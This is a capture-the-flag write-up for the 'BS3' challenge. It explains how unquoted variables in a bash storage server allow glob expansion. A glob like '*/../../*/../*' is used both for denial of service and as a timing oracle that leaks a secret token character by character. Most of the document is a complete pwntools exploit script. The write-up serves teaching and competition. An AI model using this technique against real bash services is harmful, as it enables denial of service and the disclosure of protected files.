# TeamItaly Preselection CTF 2024

## [misc] BS3 (0 solves)

Check out my amazing private storage system:

`nc bs3.challs.external.open.ecsc2024.it 38315`

Author: Lorenzo Catoni <@lorenzcat>

## Overview

The challenge is a tcp server in bash that allows the user to store and retrieve files. To store a file the user must request a token, each token corresponds to a folder in which the user can store or read files. The goal of the challenge is to retrieve the flag file, stored in a folder whose token is unknown.

## Solution

The problem is that the server never puts quotes around the variables and thus they are subject to word splitting and globbing. This is a very insecure practice and it can lead to a wide range of vulnerabilities. One of them is denial of service, immagine a string like: `/*/../*/../*/../*/../*`, it would expand to match all files in the root directory, then for each directory matched it would go back to root with `..` and match again all files in the root and so on matching an huge number of files. As you can imagine this could be a very slow operation and could lead to a denial of service.

In our case we can use this to discover the token of the flag folder, let's say the flag folder is `2e43504685f3cfea`, the glob of `1*/../../*/../*/../*/../*` is instantaneous because it doesn't match any file starting with 1, the glob of `2*/../../*/../*/../*/../*` however takes a very long time as explained before. We can use this to discover the token of the flag folder one character at a time by checking which character makes the glob take a long time.

## Exploit

```py
#!/usr/bin/env python3

import os

HOST = os.environ.get("HOST", "todo.challs.todo.it")
PORT = int(os.environ.get("PORT", 38315))

from base64 import b64decode
from dataclasses import dataclass
from pwn import remote
import time

r = remote(HOST, PORT, level='info')

# find correct number of wildcards to notice slowdown
payload = b'*/../../*'
for i in range(20):
 r.recvuntil(b'4. Exit\n')
 r.sendline(b'2')
 r.recvuntil(b'Enter token:')
 r.sendline(payload + b'/../*'*i)
 r.recvuntil(b'Enter file name:')
 r.sendline(b'asd')
 t0 = time.time()
 r.recvline()
 dt = time.time() - t0

 # 1 second should be enough to distinguish cases, 
 # if it pings slower than that it's a problem
 if dt > 1:
  break
else:
 raise Exception('Impossible')

print(f'{dt=}, {i=}')
payload += b'/../*'*i

@dataclass
class Timed:
 b: bytes
 t: float

found = b''
for _ in range(16):
 times = []
 for s in b'0123456789abcdef':
  s = bytes((s,))

  r.recvuntil(b'4. Exit\n')
  r.sendline(b'2')
  r.recvuntil(b'Enter token:')
  r.sendline(found + s + payload)
  r.recvuntil(b'Enter file name:')
  r.sendline(b'asd')
  t0 = time.time()
  r.recvline()
  dt = time.time() - t0
  times.append(Timed(s, dt))

 # print(times)
 found += max(times, key=lambda e: e.t).b
 print(found) # show something


r.recvuntil(b'4. Exit\n')
r.sendline(b'3')
r.recvuntil(b'Enter token:')
r.sendline(found)
r.recvuntil(b'Enter file name:')
r.sendline(b'flag')
flag = r.recvline().strip()
print(b64decode(flag).decode())
r.close()
```
